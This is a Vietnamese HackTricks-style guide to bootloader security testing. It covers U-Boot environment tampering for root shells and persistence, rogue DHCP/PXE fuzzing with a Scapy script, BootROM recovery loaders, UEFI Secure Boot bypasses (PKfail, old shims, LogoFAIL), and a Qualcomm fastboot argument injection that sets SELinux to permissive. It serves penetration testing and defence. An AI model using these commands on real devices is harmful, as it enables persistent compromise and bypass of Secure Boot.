# Kiểm thử Bootloader

{{#include ../../banners/hacktricks-training.md}}

Các bước sau đây được khuyến nghị khi sửa đổi cấu hình khởi động thiết bị và kiểm thử các bootloader như U-Boot và các trình nạp thuộc lớp UEFI. Tập trung vào việc giành quyền thực thi mã sớm, đánh giá các cơ chế bảo vệ chữ ký/chống rollback, và khai thác các đường dẫn recovery hoặc network-boot.

Liên quan: bypass secure-boot của MediaTek bằng cách patch bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Các cách khai thác nhanh U-Boot và lạm dụng environment

1. Truy cập shell của interpreter
   - Trong lúc khởi động, nhấn một phím ngắt đã biết (thường là phím bất kỳ, 0, space hoặc một chuỗi "magic" riêng của board) trước khi `bootcmd` thực thi để vào dấu nhắc U-Boot.<sup>[[1]](#references)</sup>

2. Kiểm tra trạng thái khởi động và các biến
   - Các lệnh hữu ích:
     - `printenv` (xuất environment)
     - `bdinfo` (thông tin board, địa chỉ bộ nhớ)
     - `help bootm; help booti; help bootz` (các phương thức khởi động kernel được hỗ trợ)
     - `help ext4load; help fatload; help tftpboot` (các trình tải hiện có)

3. Sửa boot arguments để có root shell
   - Thêm `init=/bin/sh` để kernel vào shell thay vì chạy init thông thường:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot từ TFTP server
   - Cấu hình mạng và tải kernel/fit image từ LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Duy trì thay đổi thông qua môi trường
   - Nếu bộ nhớ env không được bảo vệ ghi, bạn có thể duy trì quyền kiểm soát:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Kiểm tra các biến như `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` có ảnh hưởng đến các đường dẫn dự phòng. Giá trị cấu hình sai có thể cho phép liên tục thoát vào shell.

6. Kiểm tra các tính năng debug/không an toàn
   - Tìm: `bootdelay` > 0, `autoboot` bị tắt, `usb start; fatload usb 0:1 ...` không hạn chế, khả năng dùng `loady`/`loads` qua serial, `env import` từ phương tiện không đáng tin cậy và kernel/ramdisk được tải mà không kiểm tra chữ ký.

7. Kiểm thử image/xác minh U-Boot
   - Nếu nền tảng tuyên bố hỗ trợ secure/verified boot với FIT image, hãy thử cả image chưa ký và image đã bị chỉnh sửa:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Việc thiếu `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` hoặc hành vi `verify=n` cũ thường cho phép khởi động payload tùy ý.
   - Đừng chỉ dừng ở kết quả cho phép/từ chối: nghiên cứu FIT gần đây cho thấy chính đường dẫn xác minh có thể là bề mặt tấn công pre-auth. Hãy kiểm thử âm tính dữ liệu FIT lưu bên ngoài (`data-offset`, `data-position`, `data-size`), lựa chọn cấu hình đã ký, `loadables` và cách xử lý overlay / `extra-conf`.
   - Nếu có source tree tương ứng, `test/vboot/vboot_test.sh` là cách nhanh để tái hiện hành vi xác minh FIT trong U-Boot sandbox trước khi đụng đến phần cứng thật.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` và các bootflow bằng script
   - Trên các bản dựng U-Boot hiện đại, `bootcmd` thường chỉ là một wrapper cho Standard Boot. Điều đó có nghĩa là phương tiện lưu trữ có thể ghi, PXE hoặc SPI flash có thể trở thành ranh giới tin cậy thực sự, ngay cả khi môi trường hiển thị có vẻ vô hại.
   - `extlinux` bootmeth tìm `extlinux/extlinux.conf` bên dưới `/` và `/boot`; script bootmeth tìm `boot.scr.uimg` trước rồi đến `boot.scr`. Khi khởi động qua mạng, tên tệp script có thể lấy từ `boot_script_dhcp`.
   - Các lệnh phân loại ban đầu hữu ích:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Các trường hợp lạm dụng cần kiểm thử: phương tiện USB/SD do attacker kiểm soát xuất hiện sớm hơn trong `boot_targets`, `/boot/extlinux/extlinux.conf` có quyền ghi, máy chủ TFTP giả mạo cung cấp `boot.scr`, hoặc thực thi script dựa trên SPI thông qua `script_offset_f`.
   - Nếu nền tảng dựa vào xác minh FIT, hãy đảm bảo các cấu hình được ký ở cấp cấu hình chứ không chỉ ký từng image; `required-mode=all` an toàn hơn so với việc chấp nhận bất kỳ khóa bắt buộc đơn lẻ nào.

## Bề mặt khởi động mạng (DHCP/PXE) và máy chủ giả mạo

9. Fuzzing tham số PXE/DHCP
   - Cơ chế xử lý BOOTP/DHCP cũ của U-Boot từng có các vấn đề về an toàn bộ nhớ. Ví dụ, CVE‑2024‑42040 mô tả việc tiết lộ bộ nhớ thông qua các phản hồi DHCP được tạo thủ công, có thể làm rò rỉ byte từ bộ nhớ U-Boot qua mạng.<sup>[[4]](#references)</sup> Kiểm thử các đường dẫn mã DHCP/PXE với những giá trị quá dài hoặc trường hợp biên (tên file khởi động của tùy chọn 67, các tùy chọn vendor, trường file/servername) và theo dõi tình trạng treo/leak.
   - Đoạn Scapy tối giản để kiểm thử các tham số khởi động trong quá trình netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Đồng thời xác thực xem các trường filename của PXE có được truyền vào logic shell/loader mà không qua bước làm sạch khi được nối với các script provisioning phía OS hay không.

10. Kiểm thử command injection trên rogue DHCP server
   - Thiết lập dịch vụ rogue DHCP/PXE và thử chèn ký tự vào các trường filename hoặc options để tiếp cận trình thông dịch lệnh ở các giai đoạn sau trong chuỗi khởi động. Metasploit’s DHCP auxiliary, `dnsmasq` hoặc các script Scapy tùy chỉnh đều phù hợp. Trước tiên, hãy đảm bảo cô lập mạng lab.

## Các chế độ khôi phục SoC ROM có thể ghi đè quy trình khởi động thông thường

Nhiều SoC có chế độ "loader" trong BootROM, cho phép nhận code qua USB/UART ngay cả khi các flash image không hợp lệ. Nếu các secure-boot fuse chưa được đốt, chế độ này có thể cho phép thực thi code tùy ý từ rất sớm trong chuỗi khởi động.

- NXP i.MX (Serial Download Mode)
  - Công cụ: `uuu` (mfgtools3) hoặc `imx-usb-loader`.
  - Ví dụ: `imx-usb-loader u-boot.imx` để đẩy và chạy U-Boot tùy chỉnh từ RAM.
- Allwinner (FEL)
  - Công cụ: `sunxi-fel`.
  - Ví dụ: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` hoặc `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Công cụ: `rkdeveloptool`.
  - Ví dụ: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` để nạp loader và tải lên U-Boot tùy chỉnh.

Đánh giá xem thiết bị có eFuses/OTP cho secure-boot đã được đốt hay chưa. Nếu chưa, các chế độ tải xuống của BootROM thường có thể bỏ qua mọi bước xác minh cấp cao hơn (U-Boot, kernel, rootfs) bằng cách thực thi trực tiếp payload ở giai đoạn đầu tiên của bạn từ SRAM/DRAM.

## Kiểm tra nhanh bootloader UEFI/PC

11. Kiểm thử can thiệp ESP, rollback và đăng ký key
   - Gắn EFI System Partition (ESP) và kiểm tra các thành phần loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, các đường dẫn logo của vendor.
   - Khi có thể, hãy dump trạng thái Secure Boot và các cơ sở dữ liệu key từ OS:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Nếu nền tảng đang ở Setup Mode, chấp nhận đăng ký key mà không cần xác thực hoặc xuất xưởng với Platform Key thử nghiệm/mặc định (thuộc nhóm PKfail), quản trị viên cục bộ hoặc kẻ tấn công có quyền truy cập vật lý có thể đăng ký KEK/db của riêng mình và khiến Secure Boot vẫn hiển thị là “được bật” trong khi khởi động các EFI binary tùy ý.<sup>[[3]](#references)</sup>
   - Thử khởi động bằng các thành phần khởi động đã ký bị hạ cấp hoặc đã biết là có lỗ hổng nếu danh sách thu hồi của Secure Boot (dbx) chưa được cập nhật. Nếu nền tảng vẫn tin cậy các shim/bootmanager cũ, bạn thường có thể tải kernel hoặc `grub.cfg` của riêng mình từ ESP để tạo persistence.

12. Kiểm tra thu hồi shim / SBAT / dbx lỗi thời
   - Các shim cũ được Microsoft ký và các fork của nhà cung cấp vẫn có thể tạo thành đường tấn công bootkit kiểu BYOVD nếu danh sách thu hồi đã lỗi thời. Trong một lab biệt lập, đặt một shim từng có lỗ hổng lên ESP rồi thử chainload `grubx64.efi` hoặc kernel của riêng bạn.<sup>[[11]](#references)</sup>
   - Phân loại nhanh:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Nếu shim vẫn chạy dù nằm trong danh sách thu hồi, firmware/OS có các bản cập nhật `dbx` cũ hoặc tin cậy một loader fork chưa bao giờ kế thừa các biện pháp bảo vệ SBAT từ upstream.

13. Lỗi phân tích logo khởi động (nhóm LogoFAIL)
   - Một số firmware OEM/IBV có lỗ hổng do lỗi phân tích ảnh trong DXE khi xử lý logo khởi động. Nếu kẻ tấn công có thể đặt một ảnh được tạo thủ công vào ESP theo đường dẫn riêng của nhà cung cấp (ví dụ: `\EFI\<vendor>\logo\*.bmp`) rồi khởi động lại, có thể thực thi mã trong giai đoạn khởi động sớm ngay cả khi Secure Boot được bật. Hãy kiểm tra xem nền tảng có chấp nhận logo do người dùng cung cấp hay không và các đường dẫn đó có thể ghi được từ OS hay không.<sup>[[2]](#references)</sup>


## Các lỗ hổng tin cậy của Android/Qualcomm ABL + GBL (Android 16)

Trên các thiết bị Android 16 sử dụng ABL của Qualcomm để tải **Generic Bootloader Library (GBL)**, hãy xác minh xem ABL có **xác thực** ứng dụng UEFI mà nó tải từ phân vùng `efisp` hay không. Nếu ABL chỉ kiểm tra **sự hiện diện** của ứng dụng UEFI mà không xác minh chữ ký, khả năng ghi vào `efisp` sẽ cho phép **thực thi mã không ký trước OS** khi khởi động.<sup>[[6]](#references)[[7]](#references)</sup>

Các bước kiểm tra thực tế và hướng khai thác:

- **Khả năng ghi vào efisp**: Cần có cách ghi ứng dụng UEFI tùy chỉnh vào `efisp` (dịch vụ root/đặc quyền, lỗi trong ứng dụng OEM, đường dẫn recovery/fastboot). Nếu không có khả năng này, không thể trực tiếp tiếp cận lỗ hổng tải GBL.<sup>[[6]](#references)</sup>
- **Chèn tham số OEM fastboot** (lỗi ABL): Một số bản build chấp nhận các token bổ sung trong `fastboot oem set-gpu-preemption` và nối chúng vào dòng lệnh kernel. Có thể dùng cách này để buộc SELinux chạy ở chế độ permissive, qua đó cho phép ghi vào phân vùng được bảo vệ:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Nếu thiết bị đã được vá, lệnh phải từ chối các đối số bổ sung.<sup>[[5]](#references)[[6]](#references)</sup>
- **Mở khóa bootloader qua các cờ lưu bền**: Payload ở giai đoạn boot có thể thay đổi các cờ mở khóa lưu bền (ví dụ: `is_unlocked=1`, `is_unlocked_critical=1`) để mô phỏng `fastboot oem unlock` mà không cần qua các bước kiểm tra máy chủ/phê duyệt của OEM. Trạng thái này sẽ được duy trì sau lần khởi động lại tiếp theo.<sup>[[6]](#references)</sup>

Ghi chú phòng thủ/triage:

- Xác nhận ABL có thực hiện xác minh chữ ký trên payload GBL/UEFI từ `efisp` hay không. Nếu không, hãy xem `efisp` là một bề mặt lưu trú có rủi ro cao.
- Theo dõi xem các trình xử lý fastboot OEM của ABL có được vá để **xác thực số lượng đối số** và từ chối các token bổ sung hay không.<sup>[[8]](#references)[[9]](#references)</sup>

## Lưu ý về phần cứng

Cẩn trọng khi thao tác với flash SPI/NAND trong giai đoạn boot sớm (ví dụ: nối đất các chân để bỏ qua thao tác đọc) và luôn tham khảo datasheet của flash. Chập mạch sai thời điểm có thể làm hỏng thiết bị hoặc bộ nạp.

## Ghi chú và mẹo bổ sung

- Thử `env export -t ${loadaddr}` và `env import -t ${loadaddr}` để chuyển các khối dữ liệu môi trường giữa RAM và bộ nhớ lưu trữ; một số nền tảng cho phép nhập env từ thiết bị lưu trữ di động mà không cần xác thực.
- Để duy trì quyền truy cập trên các hệ thống dựa trên Linux khởi động qua `extlinux.conf`, thường chỉ cần sửa dòng `APPEND` (để chèn `init=/bin/sh` hoặc `rd.break`) trên phân vùng boot nếu không có bước kiểm tra chữ ký.
- Nếu mục tiêu sử dụng cập nhật hai phân vùng / A/B, hãy xem lại các kỹ thuật anti-rollback và slot-desync trong [tổng quan phân tích firmware](README.md) để không bỏ sót các lỗ hổng tin cậy chỉ có ở trình cập nhật, nằm ngoài chính bootloader.
- Nếu userland cung cấp `fw_printenv/fw_setenv`, hãy xác thực rằng `/etc/fw_env.config` khớp với vùng lưu trữ env thực tế. Các offset cấu hình sai có thể khiến bạn đọc/ghi nhầm vùng MTD.

## References

- [1] [Phương pháp kiểm thử bảo mật firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Tìm hiểu LogoFAIL: Mối nguy từ việc phân tích hình ảnh trong quá trình khởi động hệ thống](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Các khóa nền tảng không đáng tin cậy làm suy yếu Secure Boot trên hệ sinh thái UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Chi tiết CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Ngăn chặn trước: Mở khóa Xiaomi bằng hai chuỗi không được làm sạch](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit GBL trên Qualcomm Snapdragon 8 Elite cho phép kẻ tấn công mở khóa bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Kiến trúc Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Sửa lỗi truyền dữ liệu đầu vào không đáng tin cậy vào dòng lệnh kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Thêm kiểm tra cho lệnh set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Không thể khởi động: Phá vỡ quá trình xác minh chữ ký FIT của U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Ghi chú về lỗ hổng VU#616257 - Các bootloader shim UEFI được Microsoft ký có nguy cơ bị vượt qua Secure Boot](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
